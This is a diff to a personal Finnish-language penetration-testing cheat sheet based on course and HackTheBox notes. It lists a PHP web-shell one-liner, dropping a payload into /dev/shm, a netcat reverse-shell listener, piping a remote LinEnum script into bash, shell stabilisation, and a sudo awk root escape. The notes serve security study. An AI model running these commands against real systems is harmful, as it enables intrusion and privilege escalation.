@@ -388,6 +388,8 @@ censys
 shodan
 maltego
 
+LinEnum			<--->	Githubissa ohjelma, joka etsii upgrade haavoituvuuksia 
+PayloadsAllTheThings	<--->	Githubissa payloadeja eri kielille
 ________________________________________________________________________________________________________________________________
 ** Pentest alkeet **
 rmmod pcspkr                                    <--->   Piip ääni pois kalista
@@ -476,6 +478,7 @@ ipcalc 10.0.0.0
 
 nmap -n -vvv 10.10.10.1-254 --top-ports 10 | tee portscan.txt
 nmap -n -sV -sC -Pn 10.10.10.10 | tee 10portscan.txt
+nmap -sC -sV -oA localhostscan localhost
 
 -sV                                     <--->   Bannerit eli versiotiedot
 alt+.                                   <--->   viimeisen komennon viimeinen sana
@@ -549,6 +552,7 @@ ________________________________________________________________________________
 hashcat -m --force /root/hash/md5.txt /usr/share/wordlists/fasttrack.txt        <--->   hc md5 esim
 --show                                                                          <--->   Jos salasana jo crackatty
 echo -n 'salasana' | md5sum | tee -a tiedosto.txt                               <--->   Ei ylikirjoita vaan jatkaa tiedostoa
+echo -n encyptedpass | base64 -d						<--->	Base64 decryption
 tar -xvf                                                                        <--->   Avaa tar tiedostoja
 gunzip rockyou.txt.gz                                                           <--->   Avaa rockyou listan
 free 50000 words terokarvinen                                                   <--->   Sanalista suomi eng
@@ -583,18 +587,41 @@ fg					<--->
 
 ________________________________________________________________________________________________________________________________
 ** Reverse shell **
-<?php echo system($_REQUEST['fun']); ?>	<--->	Koodin toimivuus testi
-?fun=whoami				<--->	Selaimessa tiedoston peraan
+<?php echo system($_REQUEST['fun']); ?>				<--->	Koodin toimivuus testi
+?fun=whoami							<--->	Selaimessa tiedoston peraan
 
 python -m SimpleHTTPServer 8000					<--->   Lataus serveri
 wget 10.10.10.10:8000/filename.php -O /dev/shm/.name.php	<--->   Tiedoston lataus selaimella
 nc -v -n -l -p 5005						<--->	Reverse shell omalle koneelle pentestmonkey php
 
+python3 -c 'import pty;pty.spawn("/bin/bash")'			<--->	tty shell
+
+CTRL+Z								<--->	Vie taustalle
+stty -a								<--->	Tab mod paalle
+stty raw -echo							<--->	Tab auto comp paalle
+fg								<--->	Ohjelma taustalta takaisin
+stty rows 49							<--->	49 tty riveja
+stty cols 185							<--->	185 tty kolumneja
+
+ps aux | grep root						<--->	root oikeuden ohjelmien haku
+
+________________________________________________________________________________________________________________________________
+** LinEnum **
+curl 10.10.10.10/LinEnum/LinEnum.sh | bash			<--->	Python http palvelimelta suoraan portti 80
+SUID								<--->	root kayttajalla ajettavia ohjelmia
+
+________________________________________________________________________________________________________________________________
+** sudo privesc **
+sudo awk 'BEGIN {system("/bin/sh")}'				<--->	Root user awklla
+
 ________________________________________________________________________________________________________________________________
 
 
+SOURCES
 Pohjana Tero Karvinen 2019: Penetration Testing kurssi, http://terokarvinen.com
+Ippsec youtube HackTheBox series, https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA
+Priv Escalation from sudo, https://www.andreafortuna.org/2018/05/16/exploiting-sudo-for-linux-privilege-escalation/
 
 
-*****************************************************************************************************
-*****************************************************************************************************
+********************************************************************************************************************************
+********************************************************************************************************************************
